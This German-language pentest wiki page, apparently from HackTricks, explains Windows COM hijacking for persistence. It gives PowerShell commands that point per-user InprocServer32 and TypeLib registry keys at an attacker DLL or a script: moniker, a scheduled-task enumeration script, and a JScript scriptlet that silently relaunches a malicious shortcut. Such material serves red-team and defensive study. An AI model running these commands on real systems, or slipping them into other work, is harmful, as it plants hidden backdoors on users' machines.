# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Suche nach nicht existierenden COM-Komponenten

Da die Werte von HKCU von Benutzern geändert werden können, kann **COM Hijacking** als Mechanismus zur Persistenz verwendet werden. Mit `procmon` ist es einfach, nach COM-Registry-Einträgen zu suchen, die nicht existieren und die ein Angreifer erstellen könnte, um Persistenz zu erreichen. Filter:

- **RegOpenKey**-Operationen.
- wobei das _Result_ **NAME NOT FOUND** ist.
- und der _Path_ mit **InprocServer32** endet.

Sobald Sie entschieden haben, welches nicht vorhandene COM Sie übernehmen möchten, führen Sie die folgenden Befehle aus. _Seien Sie vorsichtig, wenn Sie ein COM übernehmen, das alle paar Sekunden geladen wird, da das übertrieben sein könnte._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Übernehmbare Task Scheduler COM-Komponenten

Windows Tasks verwenden Custom Triggers, um COM objects aufzurufen, und da sie über den Task Scheduler ausgeführt werden, ist es einfacher vorherzusagen, wann sie ausgelöst werden.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Wenn du die Ausgabe prüfst, kannst du z. B. einen auswählen, der beispielsweise bei jeder Benutzeranmeldung ausgeführt wird.

Wenn du nun die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** und in HKLM und HKCU suchst, wirst du normalerweise feststellen, dass der Wert in HKCU nicht existiert.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dann kannst du einfach den HKCU-Eintrag erstellen, und jedes Mal, wenn sich der Benutzer anmeldet, wird deine backdoor ausgelöst.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definieren COM-Interfaces und werden via `LoadTypeLib()` geladen. Wenn ein COM-Server instanziiert wird, kann das OS die zugehörige TypeLib laden, indem es die Registrierungsschlüssel unter `HKCR\TypeLib\{LIBID}` abfragt. Wenn der TypeLib-Pfad durch einen **moniker** ersetzt wird, z. B. `script:C:\...\evil.sct`, führt Windows das scriptlet aus, wenn die TypeLib aufgelöst wird – was eine heimliche Persistenz erzeugt, die ausgelöst wird, wenn häufig verwendete Komponenten berührt werden.

Dies wurde gegen das Microsoft Web Browser control beobachtet (häufig geladen von Internet Explorer, Apps, die WebBrowser einbetten, und sogar `explorer.exe`).

### Schritte (PowerShell)

1) Identifiziere die TypeLib (LIBID), die von einem häufig genutzten CLSID verwendet wird. Beispiel-CLSID, das oft von malware chains missbraucht wird: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Weisen Sie den benutzerbezogenen TypeLib-Pfad auf ein lokales scriptlet mit dem Moniker `script:` (keine Administratorrechte erforderlich):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Lege eine minimale JScript `.sct` ab, die dein primäres payload neu startet (z. B. eine `.lnk`, die von der initialen Chain verwendet wird):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Auslösen – Das Öffnen von IE, einer Anwendung, die das WebBrowser control einbettet, oder sogar routinemäßige Explorer-Aktivität wird die TypeLib laden und das scriptlet ausführen und so deine Kette bei logon/reboot erneut scharfstellen.

Bereinigung
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Hinweise
- Sie können dieselbe Logik auf andere häufig verwendete COM-Komponenten anwenden; ermitteln Sie jedoch immer zuerst die tatsächliche `LIBID` aus `HKCR\CLSID\{CLSID}\TypeLib`.
- Auf 64-Bit-Systemen können Sie außerdem den Unterschlüssel `win64` für 64-Bit-Clients befüllen.

## Quellen

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
